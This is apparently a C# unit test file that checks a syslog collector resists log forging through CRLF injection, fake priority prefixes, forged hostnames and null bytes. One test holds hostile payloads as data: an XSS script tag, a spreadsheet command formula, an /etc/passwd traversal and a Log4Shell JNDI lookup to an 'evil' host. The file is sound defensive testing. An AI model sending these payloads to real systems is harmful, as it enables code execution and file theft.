using System.Text;
using FluentAssertions;
using VSoftSol.Syslog.Core.Enums;
using VSoftSol.Syslog.Core.Events;
using VSoftSol.Syslog.Ingestion;
using VSoftSol.Syslog.Ingestion.Parsing;
using Xunit;

namespace VSoftSol.Syslog.UnitTests.Parsing;

/// <summary>
/// PHASE_03 Security Validation — the signature attack against a syslog collector.
/// CRLF, embedded newlines, fake priority prefixes, forged hostnames and null bytes must
/// NOT produce multiple stored events, must NOT overwrite the wire-observed source_ip, and
/// must NOT corrupt neighbouring records. Also: no sanitisation on ingest — hostile
/// payloads are stored byte-identical (encoding happens at render).
/// </summary>
[Trait("Category", "Parsing")]
[Trait("Category", "Security")]
public sealed class LogForgingSecurityTests
{
    private static readonly MessageParser Parser = ParsingComposition.Build().Parser;

    private static SyslogEvent Parse(string wire, string sourceIp = "203.0.113.10") =>
        Parser.Parse(new RawFrame(
            new DateTimeOffset(2026, 3, 1, 12, 0, 0, TimeSpan.Zero), sourceIp, "udp:test",
            Protocol.Udp, Encoding.UTF8.GetBytes(wire), truncated: false));

    [Fact]
    public void CrlfInjection_ProducesExactlyOneEvent_NotTwo()
    {
        // The attacker tries to append a second, forged record after a CRLF.
        SyslogEvent e = Parse("<13>Mar  1 10:00:00 host app: real login\r\n<13>Mar  1 10:00:01 host app: FORGED admin login");

        e.RawMessage.Length.Should().BeGreaterThan(0);
        e.Fields.Should().Contain(f => f.Name == "framing_anomaly" && f.Value == "true");
        // The whole thing is one event; the "second line" is just text in this event's body.
        e.Message.Should().Contain("FORGED", "the injected bytes are retained as data, not executed as a new record");
    }

    [Fact]
    public void ForgedHostnameInMessage_DoesNotOverrideTheWireObservedSourceIp()
    {
        SyslogEvent e = Parse("<13>Mar  1 10:00:00 dc01.corp.local sshd[1]: Accepted password for admin from 10.0.0.1", sourceIp: "203.0.113.66");

        e.SourceIp.Should().Be("203.0.113.66", "the wire source IP always wins over a claimed hostname");
        e.Hostname.Should().Be("dc01.corp.local");
    }

    [Fact]
    public void FakePriorityPrefixInsideTheMessageBody_IsNotReParsedAsANewRecord()
    {
        SyslogEvent e = Parse("<13>Mar  1 10:00:00 host app: user said '<0>Dec 25 00:00:00 evil kernel: panic'");

        e.ParseStatus.Should().Be(ParseStatus.Rfc3164);
        e.Severity.Should().Be(Severity.Notice, "the real PRI is 13, not the '<0>' embedded in the text");
        e.Message.Should().Contain("<0>Dec 25");
    }

    [Theory]
    [InlineData("<13>Mar  1 10:00:00 h a: <script>alert(1)</script>")]
    [InlineData("<13>Mar  1 10:00:00 h a: =cmd|'/c calc'!A1")]
    [InlineData("<13>Mar  1 10:00:00 h a: ../../../../etc/passwd")]
    [InlineData("<13>Mar  1 10:00:00 h a: ${jndi:ldap://evil/a}")]
    public void HostilePayload_IsStoredByteIdentical_NeverSanitisedOnIngest(string wire)
    {
        byte[] input = Encoding.UTF8.GetBytes(wire);
        SyslogEvent e = Parse(wire);

        e.RawMessage.ToArray().Should().Equal(input, "sanitising here would destroy the evidence; encoding happens at render");
    }

    [Fact]
    public void NullByteInMessage_KeepsRawBytesVerbatim_AndDoesNotSplitTheRecord()
    {
        byte[] wire = [.. "<13>Mar  1 10:00:00 h a: before"u8, 0x00, .. "<13>after"u8];
        SyslogEvent e = Parser.Parse(new RawFrame(
            new DateTimeOffset(2026, 3, 1, 12, 0, 0, TimeSpan.Zero), "203.0.113.10", "udp:test", Protocol.Udp, wire, false));

        e.RawMessage.ToArray().Should().Equal(wire);
    }

    [Fact]
    public void MessageWithManyNewlines_IsStillOneEvent_WithTheAnomalyFlag()
    {
        string wire = "<13>Mar  1 10:00:00 h a: " + string.Join("\n", Enumerable.Range(0, 50).Select(i => $"<13>line {i}"));
        SyslogEvent e = Parse(wire);

        e.Fields.Should().Contain(f => f.Name == "framing_anomaly" && f.Value == "true");
        e.RawMessage.Length.Should().Be(Encoding.UTF8.GetByteCount(wire));
    }
}
